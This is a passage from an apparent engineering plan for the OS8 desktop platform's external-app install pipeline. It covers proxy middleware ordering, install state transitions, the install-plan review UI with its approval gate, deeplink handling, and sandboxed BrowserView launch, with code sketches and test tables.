// (b) Inside startServer's listen callback (lines 774-798), AFTER setupCallStream(server)
//     at line 798 and BEFORE the setTimeout block at line 800:

ReverseProxyService.attachUpgradeHandler(server);
```

### Why the order doesn't break native apps

Both new middlewares dispatch on the request's `Host` header. Native apps reach OS8 on bare `localhost:8888` (or `127.0.0.1:8888` or the LAN IP); external apps reach it on `<slug>.localhost:8888`. After PR 1.15:

- `GET /<native-app-id>/index.html` with `Host: localhost:8888` — `scopedApiMiddleware` → no match (Host isn't a subdomain); `ReverseProxyService.middleware()` → no match (Host isn't a subdomain); falls through to catch-all → React shell. ✓
- `GET /` with `Host: <external-slug>.localhost:8888` — `scopedApiMiddleware` → no match (path isn't `/_os8/api/...`); `ReverseProxyService.middleware()` → match by Host → proxy to upstream. Catch-all not reached. ✓
- `GET /_os8/api/blob/foo` with `Host: <external-slug>.localhost:8888` — `scopedApiMiddleware` → match, rewrites to `/api/apps/<id>/blob/foo`, sets `req.callerAppId`; subsequent middleware reaches the existing `/api/apps/:appId/blob` router (server.js:424). ✓
- `GET /api/apps` with `Host: <external-slug>.localhost:8888` (a misuse attempt) — neither new middleware matches (path isn't `/_os8/api/...`); falls into the existing `/api/apps` router; that router does NOT have `requireAppContext` mounted (it's a shell route per plan §10 Q9), so it serves the response. **However**, the request originated from a different browser origin (`<slug>.localhost:8888`) than the OS8 main UI (`localhost:8888`), so a browser-issued `fetch('http://localhost:8888/api/apps')` from the app would have failed CORS preflight. Direct `curl` access works (it's not browser-mediated) but external-app code in the BrowserView can't make that call without us responding with `Access-Control-Allow-Origin`. ✓

### Tests

`tests/server-mount-order.test.js`:

| Setup | Request | Expected |
|---|---|---|
| Native app `myapp` exists | `GET /myapp/` with `Host: localhost:8888` | React shell HTML (existing behavior) |
| Pre-register external `worldmonitor` at port 5173 (mock upstream) | `GET /` with `Host: worldmonitor.localhost:8888` | upstream HTML |
| External app declares `[blob.readonly]` | `GET /_os8/api/blob/x` with `Host: worldmonitor.localhost:8888` | rewritten to `/api/apps/<id>/blob/x` |
| Same | `PUT /_os8/api/blob/x` with `Host: worldmonitor.localhost:8888` | 403 (caps don't allow write) |
| Bare host, slug-prefixed path | `GET /worldmonitor/` with `Host: localhost:8888` | falls through to catch-all (which 404s — `worldmonitor` is an external app, not served on bare host) |

### Acceptance criteria

- All existing OS8 native-app tests still pass (regression check).
- Registering an external app and `curl -H 'Host: worldmonitor.localhost:8888' http://localhost:8888/` reaches the upstream.
- WebSocket upgrade with subdomain Host succeeds (verified via PR 1.14's smoke test).

### Cross-platform notes

None.

### Spec deviations

None.

### Depends on

PR 1.7, PR 1.13, **PR 1.14 (gate).**

### Open sub-questions

None.

---

## PR 1.16 — `AppCatalogService.install` full pipeline (split: 1.16a + 1.16b)

**GATED behind PR 1.14.**

**Goal.** Glue the install state machine end-to-end: `awaiting_approval → installing → installed`. Atomic move staging→apps. `apps` row insert with `app_type='external'`. Secrets save. `git checkout -b user/main`. Fire-and-forget `track-install` POST to os8.ai.

**Split rationale.** Plan estimates ~450 LOC. Split:

- **1.16a** (~250 LOC): orchestrator + state transitions + adapter call.
- **1.16b** (~200 LOC): atomic move + apps row + git init + track-install.

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/app-installer.js` — add `approve(jobId, secrets)` and `_runApprove(jobId, secrets)`.
- **Modify:** `/home/leo/Claude/os8/src/services/app-catalog.js` — add `install(db, opts)` thin façade calling `AppInstaller.start`.
- **Modify:** `/home/leo/Claude/os8/src/routes/app-store.js` — make `POST /jobs/:id/approve` actually work (was 501 in PR 1.5).
- **Modify:** `/home/leo/Claude/os8/src/services/app.js` — add `createExternal(db, opts)` and `uniqueSlug(db, base)` helpers.

### Approve flow (1.16a)

```js
// src/services/app-installer.js — extends PR 1.5

AppInstaller.approve = async function(db, jobId, { secrets = {} }) {
  const job = InstallJobs.get(db, jobId);
  if (!job) throw new Error('job not found');
  if (job.status !== 'awaiting_approval') throw new Error(`job in status ${job.status}`);
  setImmediate(() => AppInstaller._runApprove(db, jobId, secrets)
    .catch(err => InstallJobs.fail(db, jobId, err.message)));
  return InstallJobs.transition(db, jobId, { from: 'awaiting_approval', to: 'installing' });
};

AppInstaller._runApprove = async function(db, jobId, secrets) {
  const job = InstallJobs.get(db, jobId);
  const stagingDir = job.staging_dir;

  // 1. Resolve manifest (cached on the catalog).
  const entry = await AppCatalogService.get(db, job.external_slug, { channel: job.channel });
  const manifest = entry.manifest;

  // 2. Mint apps row UPFRONT (status='installing'). We need its UUID to scope secrets.
  const localSlug = AppService.uniqueSlug(db, manifest.slug);
  const app = AppService.createExternal(db, {
    name: manifest.name, slug: localSlug, externalSlug: manifest.slug,
    channel: entry.channel, framework: manifest.framework || null,
    manifestYaml: entry.manifestYaml, manifestSha: entry.manifestSha,
    catalogCommitSha: entry.catalogCommitSha,
    upstreamDeclaredRef: entry.upstreamDeclaredRef,
    upstreamResolvedCommit: entry.upstreamResolvedCommit,
    statusOverride: 'installing',         // sentinel; activated post-install
  });
  // Patch the job with the new app_id (still in 'installing' state).
  db.prepare('UPDATE app_install_jobs SET app_id = ?, updated_at = ? WHERE id = ?')
    .run(app.id, new Date().toISOString(), jobId);

  // 3. Save per-app secrets BEFORE running install (some scripts read .env).
  for (const [k, v] of Object.entries(secrets)) {
    EnvService.set(db, k, v, { appId: app.id, description: `from install of ${manifest.slug}` });
  }

  // 4a. Pre-flight DNS check: confirm <slug>.localhost resolves to 127.0.0.1.
  //     Modern macOS / Linux / Win11 do this natively per RFC 6761.
  //     On legacy Windows or AV-restricted setups, prompt for a hosts entry.
  await ensureSubdomainResolves(localSlug);   // throws or prompts; see below

  // 4b. Run runtime adapter install in the staging dir.
  const adapter = getAdapter(manifest.runtime.kind);
  await adapter.ensureAvailable(manifest);
  const env = buildSanitizedEnv(db, {
    appId: app.id, allocatedPort: 0,    // not used during install
    manifestEnv: manifest.env || [],
    localSlug, OS8_PORT: getPort(),
  });
  manifest._localSlug = localSlug;
  await adapter.install(manifest, stagingDir, env, (stream, chunk) =>
    InstallJobs.appendLog(db, jobId, stream, chunk));

  // 5. Atomic move staging → apps.
  const finalDir = path.join(APPS_DIR, app.id);
  await atomicMove(stagingDir, finalDir);

  // 6. Git init for fork-on-first-edit (PR 1.23 wires the rest).
  await gitInitFork(finalDir, manifest, entry.upstreamResolvedCommit);

  // 7. Generate CLAUDE.md (PR 1.21 fills in body; here defensive try/catch).
  try { require('../claude-md-external')?.generateForExternal?.(db, app); }
  catch (e) { console.warn('[Installer] CLAUDE.md gen:', e.message); }

  // 8. Activate.
  AppService.update(db, app.id, { status: 'active' });

  // 9. Final transition.
  InstallJobs.transition(db, jobId, { from: 'installing', to: 'installed' });

  // 10. Fire-and-forget track-install.
  fetch(`https://os8.ai/api/apps/${manifest.slug}/track-install`, {
    method: 'POST', signal: AbortSignal.timeout(5000),
  }).catch(() => {});
};
```

### State-machine transitions with rollback

| From | To | On failure |
|---|---|---|
| `pending → cloning` | clone fail → `failed`; `apps_staging/<jobId>/` removed | n/a |
| `cloning → reviewing` | review error → `failed`; staging cleaned | n/a |
| `reviewing → awaiting_approval` | (review service error caught upstream → `failed`) | n/a |
| `awaiting_approval → installing` | user `cancel` → `cancelled`; staging cleaned | n/a |
| `installing → installed` | adapter throws or `atomicMove` fails → `failed`. Rollback: (a) drop apps row if pre-active; (b) drop per-app secrets; (c) attempt cleanup of both `staging_dir` and `finalDir`; (d) leave dirs for `reapStaging` to mop. If atomic move already happened, finalDir cleanup may fail mid-way — fine; reapStaging picks it up. | n/a |
| terminal (`installed`/`failed`/`cancelled`) | no further transitions | uninstall (PR 1.24) for `installed` |

### Atomic-move semantics (1.16b)

```js
async function atomicMove(srcDir, dstDir) {
  // Single rename — atomic on POSIX same-FS, atomic on Windows when dst doesn't exist.
  try {
    fs.renameSync(srcDir, dstDir);
    return;
  } catch (e) {
    if (e.code !== 'EXDEV') throw e;       // not cross-mount → real failure
  }
  // EXDEV: cross-mount fallback — copy then delete with a transient marker
  // so reapStaging can detect partial state.
  const marker = path.join(path.dirname(dstDir), `.${path.basename(dstDir)}.installing`);
  fs.writeFileSync(marker, JSON.stringify({ src: srcDir, ts: Date.now() }));
  try {
    fs.cpSync(srcDir, dstDir, { recursive: true });    // Node 16.7+ (we're on 22)
    fs.rmSync(srcDir, { recursive: true, force: true });
    fs.unlinkSync(marker);
  } catch (err) {
    // Partial-copy recovery: best-effort cleanup of dstDir; leave marker.
    try { fs.rmSync(dstDir, { recursive: true, force: true }); } catch {}
    throw err;
  }
}
```

### `gitInitFork` (1.16b)

```js
async function gitInitFork(appDir, manifest, resolvedCommit) {
  const isRepo = fs.existsSync(path.join(appDir, '.git'));
  if (!isRepo) {
    await runCmd('git', ['-C', appDir, 'init']);
    await runCmd('git', ['-C', appDir, 'add', '.']);
    await runCmd('git', ['-C', appDir, 'commit', '-m',
      `OS8 install: ${manifest.slug} @ ${resolvedCommit}`]);
    await runCmd('git', ['-C', appDir, 'checkout', '-b', 'user/main']);
  } else {
    // Cloned via PR 1.5; HEAD is at resolvedCommit. Branch off + tracking ref.
    await runCmd('git', ['-C', appDir, 'checkout', '-b', 'user/main']);
    await runCmd('git', ['-C', appDir, 'branch', 'upstream/manifest', resolvedCommit]);
  }
  // Append OS8 ignores to .gitignore.
  const gi = path.join(appDir, '.gitignore');
  fs.appendFileSync(gi, [
    '', '# OS8 auto-generated',
    'node_modules/', '.venv/', '__pycache__/', 'dist/', 'build/',
    '.next/', '.cache/', '.parcel-cache/', '.svelte-kit/', '.turbo/', '*.log',
    '', '# Local config — contains secrets',
    '.env', '.env.local', '.env.*.local',
    '', '# OS8 metadata', '.os8/', ''
  ].join('\n'), 'utf8');
}
```

### `ensureSubdomainResolves` (1.16a)

Pre-flight DNS check at install time. macOS / Linux / Win11 resolve `*.localhost` natively per RFC 6761; legacy/AV-restricted Windows may not. Failure surfaces a UAC-elevated hosts-entry prompt; user can decline (install fails with a clear message) or accept (we write `/etc/hosts` or Windows equivalent and retry).

```js
const dns = require('node:dns');
const { promisify } = require('node:util');
const dnsLookup = promisify(dns.lookup);

async function ensureSubdomainResolves(localSlug) {
  const host = `${localSlug}.localhost`;
  try {
    const { address } = await dnsLookup(host, { family: 4 });
    if (address === '127.0.0.1') return;
    // Resolved but to something other than loopback — extremely unusual but
    // possible if a hosts entry redirects *.localhost. Treat as failure.
    throw new Error(`${host} resolves to ${address}, expected 127.0.0.1`);
  } catch (err) {
    // ENOTFOUND or unexpected address. Prompt for hosts entry.
    const accepted = await promptHostsEntry(host);
    if (!accepted) {
      throw new Error(
        `Cannot install: ${host} doesn't resolve to 127.0.0.1 and you declined to add a hosts entry. ` +
        `On legacy Windows, you may need to manually add "127.0.0.1  ${host}" to your hosts file.`
      );
    }
    await writeHostsEntry(host, '127.0.0.1');   // platform-specific helper
    // Re-verify.
    const { address } = await dnsLookup(host, { family: 4 });
    if (address !== '127.0.0.1') throw new Error('hosts write failed unexpectedly');
  }
}

async function promptHostsEntry(host) { /* dialog.showMessageBox → boolean */ }
async function writeHostsEntry(host, address) {
  // POSIX: spawn 'sudo', append "127.0.0.1\t<host>" to /etc/hosts.
  // Windows: spawn 'powershell' with elevated runas, append to C:\Windows\System32\drivers\etc\hosts.
}
```

For Phase 1A's slice (which uses a hand-authored manifest on dev machines), the pre-flight check is expected to no-op on macOS / Linux. The Windows path is exercised only in PR 1.28's E2E test if run on a Windows CI worker.

### `apps` row insert helper (1.16b)

```js
// In src/services/app.js
AppService.createExternal = function(db, {
  name, slug, externalSlug, channel, framework, manifestYaml, manifestSha,
  catalogCommitSha, upstreamDeclaredRef, upstreamResolvedCommit,
  color = '#6366f1', icon = null, textColor = '#ffffff',
  statusOverride = 'active'
}) {
  const id = generateId();
  const blobPath = path.join(BLOB_DIR, id);
  fs.mkdirSync(blobPath, { recursive: true });
  // appPath created by atomicMove later — DON'T create here.

  const maxOrder = db.prepare('SELECT MAX(display_order) as n FROM apps WHERE status = ?').get('active');
  const order = (maxOrder?.n ?? -1) + 1;

  db.prepare(`
    INSERT INTO apps (
      id, name, slug, status, display_order, color, icon, text_color, app_type,
      external_slug, channel, framework, manifest_yaml, manifest_sha,
      catalog_commit_sha, upstream_declared_ref, upstream_resolved_commit
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'external', ?, ?, ?, ?, ?, ?, ?, ?)
  `).run(id, name, slug, statusOverride, order, color, icon, textColor,
         externalSlug, channel, framework, manifestYaml, manifestSha,
         catalogCommitSha, upstreamDeclaredRef, upstreamResolvedCommit);

  return { id, name, slug, channel, externalSlug, path: path.join(APPS_DIR, id), blobPath };
};

AppService.uniqueSlug = function(db, baseSlug) {
  if (!db.prepare('SELECT id FROM apps WHERE slug = ?').get(baseSlug)) return baseSlug;
  let n = 2;
  while (db.prepare('SELECT id FROM apps WHERE slug = ?').get(`${baseSlug}-${n}`)) n++;
  return `${baseSlug}-${n}`;
};
```

### Routes update

```js
// src/routes/app-store.js — replace the 501 stub from PR 1.5:
router.post('/jobs/:id/approve', async (req, res) => {
  try {
    const { secrets = {} } = req.body || {};
    const job = await AppInstaller.approve(db, req.params.id, { secrets });
    res.status(202).json({ jobId: job.id, status: job.status });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});
```

### Tests

`tests/app-installer-pipeline.test.js` (integration):

| Setup | Assertion |
|---|---|
| Hand-authored worldmonitor manifest cached in `app_catalog`; PR 1.5 fetch successful | `approve` transitions `awaiting_approval → installing → installed`; apps row exists with `app_type='external'`; `~/os8/apps/<id>/` has `node_modules/`; `git -C <dir> status` clean on `user/main` |
| Same, but adapter `install` throws | job → `failed`; apps row removed; staging cleaned |
| Mock `atomicMove` to fail with EXDEV; cross-mount path triggers | falls through to copy-delete; either both dirs exist (failure) or just `finalDir` (success); job state reflects |
| `approve` called twice | second call rejected (status not `awaiting_approval`) |
| Manifest declares secret `NEWS_API_KEY`; request body provides it | `EnvService.getAllForApp(appId).NEWS_API_KEY` matches |

### Acceptance criteria

- E2E: `POST /api/app-store/install` for worldmonitor → `POST /jobs/<id>/approve` → poll `GET /jobs/<id>` → `installed`. Apps row visible in `AppService.getActive(db)`. Secrets stored. Git status clean on `user/main`.
- Crash mid-install (kill OS8 during `npm ci`): on next start, `reapStaging` (PR 1.29) cleans staging_dir; the half-installed `apps` row (status=`installing`) is detectable. v1 marks it failed (resume policy is a follow-up).

### Cross-platform notes

- `fs.renameSync` is atomic on POSIX same-FS. On Windows it's atomic when destination doesn't exist.
- `fs.cpSync({ recursive: true })` requires Node 16.7+ (we're on 22 — OK).

### Spec deviations

None.

### Depends on

PR 1.5, 1.6, 1.10, 1.11, 1.12, 1.15. **GATED behind 1.14.**

### Open sub-questions

None.

---

## PR 1.17 — Install plan review UI (split: 1.17a + 1.17b)

**Goal.** Full review UI: permissions list with "Why?" tooltips, secrets inputs with `pattern` validation, review findings collapsible by severity, install commands collapsible with argv-as-code, disk/time estimates. Approval gate enforces all required secrets entered + no critical-severity findings (with explicit override for medium-severity).

**Split.** 1.17a (~250 LOC): modal scaffold + permissions + secrets inputs. 1.17b (~300 LOC): findings panel + commands panel + progress streaming.

### Files

- **Create:** `/home/leo/Claude/os8/src/renderer/install-plan-modal.js`
- **Create:** `/home/leo/Claude/os8/styles/components/install-plan-modal.css`
- **Modify:** `/home/leo/Claude/os8/src/renderer/main.js` — wire `appStore` IPC events into the renderer flow
- **Modify:** `/home/leo/Claude/os8/preload.js` — add `appStore.install`, `appStore.approve`, `appStore.cancel`, `appStore.onJobUpdate(callback)`
- **Modify:** `/home/leo/Claude/os8/src/ipc/app-store.js` — add `app-store:install`, `app-store:approve`, `app-store:cancel` invoke handlers + a job-update event emitter

### Field-by-field render

| Section | Source | Rendering details |
|---|---|---|
| Header (icon, name, publisher, channel badge) | `app_catalog` row | 64×64 icon left; name + publisher right; channel pill (verified=green, community=yellow, developer-import=red) |
| Source repo URL | `manifest.upstream.git` | `<a target="_blank" rel="noopener">` → opens via `shell.openExternal` (renderer can't navigate) |
| License + commercial-use | `manifest.legal.license`, `manifest.legal.commercial_use`, `manifest.legal.notes` | Single line; commercial-use tooltipped: unrestricted=info, restricted=warning, prohibited=red |
| Permissions panel | `manifest.permissions.network`, `permissions.filesystem`, `permissions.os8_capabilities` | Each capability rendered as a row with its name + a "Why?" disclosure. The disclosure body is a 2-3 sentence explanation pulled from a static lookup `src/data/capability-docs.json` (PR 1.17a ships a minimal one-line-per-cap table; future expansion). Network `inbound: true` = red badge "Server reachable beyond localhost." |
| Required secrets | `manifest.permissions.secrets` | One `<input type="password">` per declared secret. Each has the `prompt` field as placeholder text and a JS `pattern` validator (matching the manifest's `pattern` regex). Validation fires on blur + before approve gate. |
| Resource expectations | `manifest.resources` | Compact pills: `Memory: 1GB`, `Disk: 800MB`, `GPU: none`. Advisory only — no enforcement. |
| Architecture compatibility | `manifest.runtime.arch` ∩ `process.arch` (renderer reads via `os8.system.getArch()`) | Green `Compatible` badge or red `Not supported on this host` (disables Approve). |
| Security review status panel (1.17b) | `app_install_jobs.review_report` | Spinner during `reviewing`. After: risk-level pill (low=green/medium=yellow/high=red); findings list collapsed by default. Each finding: severity icon, category, file:line, description, snippet (`<pre>`-rendered). Group by severity. |
| Install commands (1.17b) | `manifest.install`, `postInstall`, `preStart`, `start.argv` | Collapsible. Each command rendered as a `<code>` block with argv shown as `["arg0", "arg1", …]` (no shell-rendering — explicit argv emphasizes the safety property). |
| Dependency summary (1.17b) | from `review_report.trustAssessment` | `12 direct, 287 transitive — 0 high CVEs, 1 medium`. License roll-up: `MIT (210), Apache-2.0 (58), GPL-3.0 (1 ← review report flagged)`. |
| Disk + time estimate (1.17b) | constant table by `framework` | `Vite ~80MB ~30s`, `Next.js ~250MB ~90s`, `static ~1MB ~5s`. Advisory. |
| Buttons | always `Cancel`; `Install` (gated) | Cancel = always enabled. Install gated until: review = `low`/`medium`; ALL required secrets entered + valid; arch compatible. For `medium`: button reads "Install (override)" + a second-confirm dialog. For `high` or critical findings: Install disabled with a tooltip "Critical findings — install blocked." |

### Approve-button gate logic

```js
function canApprove(state) {
  // state = { review: { riskLevel, findings }, secrets: { entered: {...} },
  //          requiredSecretNames: [...], archCompatible: bool, secondConfirm: bool }
  if (!state.archCompatible) return { ok: false, reason: 'arch incompatible' };

  const allRequired = state.requiredSecretNames.every(n =>
    state.secrets.entered[n]?.trim()?.match(state.secrets.patterns[n] || /.*/));
  if (!allRequired) return { ok: false, reason: 'missing required secrets' };

  if (!state.review) return { ok: false, reason: 'review not yet complete' };

  const hasCritical = (state.review.findings || []).some(f => f.severity === 'critical');
  if (hasCritical) return { ok: false, reason: 'critical findings block install' };

  if (state.review.riskLevel === 'high') return { ok: false, reason: 'high risk' };

  if (state.review.riskLevel === 'medium' && !state.secondConfirm) {
    return { ok: false, reason: 'medium risk — second confirm required' };
  }

  return { ok: true };
}
```

### IPC

`preload.js` extension:

```js
appStore: {
  // existing PR 1.4: validateManifest, renderPlan
  install:  (slug, commit, channel, source) => ipcRenderer.invoke('app-store:install', { slug, commit, channel, source }),
  approve:  (jobId, secrets) => ipcRenderer.invoke('app-store:approve', jobId, secrets),
  cancel:   (jobId) => ipcRenderer.invoke('app-store:cancel', jobId),
  onJobUpdate: (callback) => {
    ipcRenderer.on('app-store:job-update', (_e, payload) => callback(payload));
  },
  removeJobUpdateListener: () => {
    ipcRenderer.removeAllListeners('app-store:job-update');
  },
}
```

`src/ipc/app-store.js`:

```js
ipcMain.handle('app-store:install', async (_e, { slug, commit, channel, source }) => {
  const job = await AppInstaller.start(db, { slug, commit, channel, source });
  return { jobId: job.id, status: job.status };
});

ipcMain.handle('app-store:approve', async (_e, jobId, secrets) => {
  return AppInstaller.approve(db, jobId, { secrets });
});

ipcMain.handle('app-store:cancel', async (_e, jobId) => {
  return InstallJobs.cancel(db, jobId);
});

// Job updates: every InstallJobs.transition fires an event bus subscribe; the
// IPC layer relays to the renderer. Wire InstallJobs to emit on a Node EventEmitter.
const InstallEvents = require('../services/install-events');   // small EventEmitter
InstallEvents.on('job-update', payload => {
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('app-store:job-update', payload);
  }
});
```

(Job update events: when `InstallJobs.transition` writes a row, also emit `InstallEvents.emit('job-update', { id, status, … })`. Single global EventEmitter — small, ~30 LOC.)

### Tests

- Unit (1.17a): `canApprove` truth table covering each gate combination.
- Visual smoke (1.17b): render the modal with mocked `entry` (worldmonitor) + mocked job updates (`reviewing` → `awaiting_approval` → `installing` → `installed`); assert each panel state.

### Acceptance criteria

- Click Install on a worldmonitor manifest → modal opens with all panels populated.
- Required secret left blank → Install button disabled with helper text.
- Mock review returns `riskLevel: 'medium'` → Install reads "Install (override)"; click → second-confirm dialog.
- Approve → progress UI streams adapter logs from `InstallEvents`.
- On completion, modal closes; app icon appears in the home grid (PR 1.19 wires the icon refresh).

### Cross-platform notes

None.

### Spec deviations

None.

### Depends on

PR 1.4 (modal scaffold + plan render IPC), PR 1.6 (review report shape), PR 1.16 (full pipeline).

### Open sub-questions

None.

---

## PR 1.18 — Wire `os8://install` → install-plan UI

**Goal.** `handleProtocolUrl` from PR 1.2 (currently logs payload + focuses window) dispatches to the install plan modal (PR 1.17). Cross-checks the requested slug against local `app_catalog`; falls back to `AppCatalogService.fetchManifest(slug, channel)` (PR 1.3) if the local mirror doesn't have it.

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/protocol-handler.js` — replace the log stub with a real dispatch
- **Modify:** `/home/leo/Claude/os8/src/ipc/app-store.js` — add `app-store:open-install-plan` IPC event
- **Modify:** `/home/leo/Claude/os8/src/renderer/install-plan-modal.js` — listen for the IPC event and open the modal

### Dispatch logic

```js
// /home/leo/Claude/os8/src/services/protocol-handler.js
async function handleProtocolUrl(url, mainWindow, { db, AppCatalogService }) {
  const parsed = parseProtocolUrl(url);
  if (!parsed.ok) {
    console.warn('[protocol] rejected:', url, '—', parsed.error);
    return;
  }

  // Confirm or fetch the manifest before opening the modal — surface a
  // sane error if os8.ai is unreachable.
  let entry = AppCatalogService.search(db, parsed.slug, { channel: parsed.channel, limit: 1 })[0];
  if (!entry) {
    try {
      entry = await AppCatalogService.fetchManifest(parsed.slug, parsed.channel);
    } catch (e) {
      // Send an error to the renderer so the user sees a dialog, not silence.
      mainWindow?.webContents.send('app-store:protocol-error', {
        slug: parsed.slug, error: e.message,
      });
      return;
    }
  }

  // Cross-check that the requested commit matches what the catalog has
  // (defense against a stale deeplink — refuse to install a different commit
  // than the manifest now points at).
  if (entry.upstreamResolvedCommit !== parsed.commit) {
    mainWindow?.webContents.send('app-store:protocol-error', {
      slug: parsed.slug,
      error: `commit mismatch — deeplink ${parsed.commit.slice(0,8)} vs catalog ${entry.upstreamResolvedCommit.slice(0,8)}. The app may have been updated; click Install on os8.ai again.`,
    });
    return;
  }

  // Open the install plan modal in the renderer.
  mainWindow?.webContents.send('app-store:open-install-plan', {
    slug: parsed.slug,
    commit: parsed.commit,
    channel: parsed.channel,
    source: parsed.source || 'os8.ai',
  });
  if (mainWindow && !mainWindow.isDestroyed()) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
}
```

The PR 1.2 wire-up at `main.js` top-of-file passes `{ db, AppCatalogService }` into `handleProtocolUrl`. (Adjust the require + the call sites.)

### Renderer event listener

```js
// /home/leo/Claude/os8/src/renderer/install-plan-modal.js (PR 1.17 + 1.18)
window.os8.appStore.onProtocolEvent?.((payload) => {
  // payload: { slug, commit, channel, source }
  openInstallPlanModal(payload);   // existing PR 1.17 entry point
});
```

`preload.js` extension:

```js
appStore: {
  ...,
  onProtocolEvent: (cb) => {
    ipcRenderer.on('app-store:open-install-plan', (_e, p) => cb(p));
    ipcRenderer.on('app-store:protocol-error',    (_e, p) => cb({ kind: 'error', ...p }));
  },
}
```

### Tests

Manual:

- macOS: `open 'os8://install?slug=worldmonitor&commit=e51058e1765ef2f0c83ccb1d08d984bc59d23f10&channel=verified'` → install plan modal opens with worldmonitor pre-loaded.
- Same with mismatched commit → error dialog: "commit mismatch."
- Same with unknown slug + os8.ai unreachable (offline test) → error dialog.

### Acceptance criteria

- Clicking Install on `os8.ai/apps/worldmonitor` (PR 0.11) launches the deeplink → OS8 focuses → modal opens with worldmonitor.
- Slug not in local catalog: `fetchManifest` runs and either populates the modal or surfaces a clear error.

### Cross-platform notes

None — all logic runs in main process; renderer passes through IPC.

### Spec deviations

None.

### Depends on

PR 1.2, PR 1.3, PR 1.17.

### Open sub-questions

None.

---

## PR 1.19 — App icon launch path + hardened BrowserView

**GATED behind PR 1.14.**

**Goal.** When a user double-clicks an app icon on the home screen, OS8 detects `app_type === 'external'`, starts the runtime process, registers the proxy, and loads `<slug>.localhost:8888/?__os8_app_id=<id>` in a hardened `BrowserView`.

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/preview.js` — add `create(appId, { external = false } = {})` overload
- **Modify:** `/home/leo/Claude/os8/src/renderer/tabs.js` — extend `createAppTab(app, options)` (lines 327-360) with the external branch
- **Modify:** `/home/leo/Claude/os8/src/renderer/preview.js` — add `loadExternalAppPreview(app)`
- **Modify:** `/home/leo/Claude/os8/src/routes/apps.js` — add `POST /api/apps/:id/processes/start` and `POST /api/apps/:id/processes/stop`
- **Modify:** `/home/leo/Claude/os8/preload.js` — extend `preview.createExternal(appId, slug)` ← thin wrapper around `preview:create-external` IPC
- **Modify:** `/home/leo/Claude/os8/src/ipc/preview.js` — add `preview:create-external` handler

### Hardened webPreferences (full object)

```js
// In /home/leo/Claude/os8/src/services/preview.js, inside create(...):
function externalWebPreferences() {
  return {
    preload: path.join(__dirname, '..', 'preload-external-app.js'),    // PR 1.9
    nodeIntegration:           false,
    contextIsolation:          true,
    sandbox:                   true,
    webSecurity:               true,
    allowRunningInsecureContent: false,
    enableBlinkFeatures:       '',
    nodeIntegrationInWorker:   false,
    nodeIntegrationInSubFrames:false,
    backgroundThrottling:      false,    // parity with native preview
  };
}
```

### `preview.js create` overload

```js
// /home/leo/Claude/os8/src/services/preview.js
create(appId, { external = false, localSlug = null } = {}) {
  if (this._views.has(appId)) return this._views.get(appId);

  const view = new BrowserView({
    webPreferences: external ? externalWebPreferences() : {
      // existing default (line 58-62)
      nodeIntegration: false,
      contextIsolation: true,
      backgroundThrottling: false,
    }
  });

  this._mainWindow.addBrowserView(view);
  view.setBounds({ x: 0, y: 0, width: 0, height: 0 });

  // Existing zoom-sync, console-relay, navigation listeners (lines 68-111)…

  if (external) {
    if (!localSlug) throw new Error('localSlug required for external view');
    const OS8_PORT = require('../server').getPort();
    const expectedHost = `${localSlug}.localhost`;

    // Restrict navigation to the app's own subdomain. With subdomain mode,
    // the gate is host-based — every external app has its own origin.
    view.webContents.on('will-navigate', (e, urlStr) => {
      try {
        const u = new URL(urlStr);
        const hostOk = u.hostname === expectedHost;
        const portOk = !u.port || u.port === String(OS8_PORT);
        if (!hostOk || !portOk) {
          e.preventDefault();
          require('electron').shell.openExternal(urlStr);
        }
      } catch {
        e.preventDefault();
      }
    });

    // Mediate window.open / target=_blank.
    view.webContents.setWindowOpenHandler(({ url }) => {
      require('electron').shell.openExternal(url);
      return { action: 'deny' };
    });

    // Deny camera/mic/geolocation/etc by default for external apps.
    view.webContents.session.setPermissionRequestHandler((_wc, _permission, cb) => cb(false));
    view.webContents.session.setPermissionCheckHandler(() => false);
  }

  this._views.set(appId, view);
  return view;
}
```

### Renderer launch flow

```js
// /home/leo/Claude/os8/src/renderer/tabs.js (around lines 327-360, in createAppTab)
export async function createAppTab(app, options = {}) {
  const existing = getAppTabByAppId(app.id);
  if (existing) { await switchToTab(existing.id); return existing; }

  // External-app branch — start the process FIRST, then build the tab.
  let externalUrl = null;
  if (app.app_type === 'external') {
    const { url, port } = await fetch(`/api/apps/${app.id}/processes/start`, { method: 'POST' })
                            .then(r => r.json());
    externalUrl = url;   // e.g. http://worldmonitor.localhost:8888/?__os8_app_id=<id>
  }

  const tab = {
    id: `app-${app.id}`,
    type: 'app', app, title: app.name, closable: true,
    state: { /* … existing fields … */, externalUrl },
  };
  addTab(tab);
  renderTabBar();
  await switchToTab(tab.id);
  return tab;
}
```

`renderer/preview.js` extension:

```js
export async function loadExternalAppPreview(app, externalUrl) {
  if (!activePreviewApps.has(app.id)) {
    await window.os8.preview.createExternal(app.id, app.slug);
    activePreviewApps.add(app.id);
  }
  await window.os8.preview.setUrl(app.id, externalUrl);
}
```

`switchToTab` / `restoreTabState` calls `loadExternalAppPreview(tab.app, tab.state.externalUrl)` instead of `loadPreviewForApp` when `tab.app.app_type === 'external'`.

### Routes

```js
// src/routes/apps.js — add POST /:id/processes/start
router.post('/:id/processes/start', async (req, res) => {
  try {
    const app = AppService.getById(db, req.params.id);
    if (!app)                          return res.status(404).json({ error: 'app not found' });
    if (app.app_type !== 'external')   return res.status(400).json({ error: 'not an external app' });

    const APR = require('../services/app-process-registry').get();
    const ReverseProxyService = require('../services/reverse-proxy');

    const r = await APR.start(app.id);
    ReverseProxyService.register(app.slug, app.id, r.port);

    const port = require('../server').getPort();
    res.json({
      url: `http://${app.slug}.localhost:${port}/?__os8_app_id=${encodeURIComponent(app.id)}`,
      port,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/:id/processes/stop', async (req, res) => {
  try {
    const app = AppService.getById(db, req.params.id);
    if (!app) return res.status(404).json({ error: 'app not found' });
    const APR = require('../services/app-process-registry').get();
    const ReverseProxyService = require('../services/reverse-proxy');
    await APR.stop(app.id);
    ReverseProxyService.unregister(app.slug);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

### Tests

Manual smoke:

